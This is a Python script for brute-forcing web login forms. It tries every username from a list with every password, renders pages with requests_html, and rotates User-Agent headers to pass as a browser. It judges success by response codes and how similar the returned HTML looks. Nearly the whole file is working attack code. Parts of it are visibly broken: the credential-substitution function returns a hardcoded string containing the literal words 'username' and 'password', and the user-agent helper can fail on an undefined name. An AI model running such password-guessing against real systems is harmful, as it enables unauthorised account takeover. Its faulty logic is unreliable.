import sys
from requests_html import HTMLSession
import time
import requests
from lxml import html
from scipy import rand
import ssl
success = False
def brute(parameters, passwords):
    '''
    sends all combinations for usernames and passwords to the attack function on the login page
    '''
    # return
    parameters['req_body_type'], parameters['req_body'] = get_req_type(parameters['headers'], parameters['req_body'])
    print("up: " + str(parameters['req_body']))

    for user in parameters['user_list']:
        user = user.strip()
        user = user.split('\t')
        parameters['username'] = user[0]
        for password in passwords:
            password = password.strip()
            password = password.split('\t')
            parameters['password'] = password[0]
            attack(parameters)


def attack(content):
    '''
   create a packet containing fake headers and the payload(username,password) and submit it to the server
    '''
    print("[+ host url]: " + str(content['host']))

    # build packet headers in order to disguise as a browser
    headers = content['headers']
    headers['User-Agent'] = get_random_user_agent()
    
    session = HTMLSession()
    res = session.get(content['host'])
    res.html.render(sleep=1, keep_page=True)

    content['req_body'] = change_cred(content['req_body'], content['user_param'], content['password_param'], content['username'], content['password'], content['req_body_type'])

    payload = content['req_body']
    
    print("[+ payload]: " + str(payload))
    
    if content['method'] == 'post':
        resp = session.post(content['host'], data=payload)
        resp.html.render(sleep=1)
    
    else:
        resp = session.get(content['host'],data=payload,headers=headers)
        resp.html.render(sleep=1)

    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
    print(resp.status_code)
    
    if check_login(resp, res):
        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
        global success
        success = True
        sys.exit(1)


def check_login(content_1, content_2):
    '''
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    '''
    from html_similarity import style_similarity, structural_similarity, similarity
    k=0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
    
    if  content_1.status_code >= 400:
        return False
    
    elif similarity < 0.7 and len(content_1.html.html) > len(content_2.html.html):
        return True
    
    elif  content_1.status_code == 201:
        return True

    else:
        return False


########################################################################################


def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def get_req_type(header, req_body):
    type = header['Content-Type']
    
    if 'json' in type:
        return 'JSON', req_body

    elif 'xml' in type:
        import xmltodict
        return 'XML', xmltodict.parse(req_body)

    else:
        import urllib
        return 'URL_ENCODED', urllib.parse.parse_qs(req_body)
        


def change_cred(req_body, user_param, pass_param, username, password, req_body_type):
    print('[+]type: ' + str(type(req_body)) + "real type: " + str(req_body_type))
    req_body[user_param] = username
    req_body[pass_param] = password
    req_body_type = 'URL_ENCODED'

    print( '\n\n\n\n\n' + str(req_body) + '\n\n\n\n\n')
    if req_body_type == 'JSON':
        return req_body
    
    elif req_body_type == 'XML':
        pass
        
    elif req_body_type == 'URL_ENCODED':
        import urllib
        return 'user_login=username&user_password=password&submit=Sign+in&user_token='+ req_body['user_token'] # convert from json to encoded

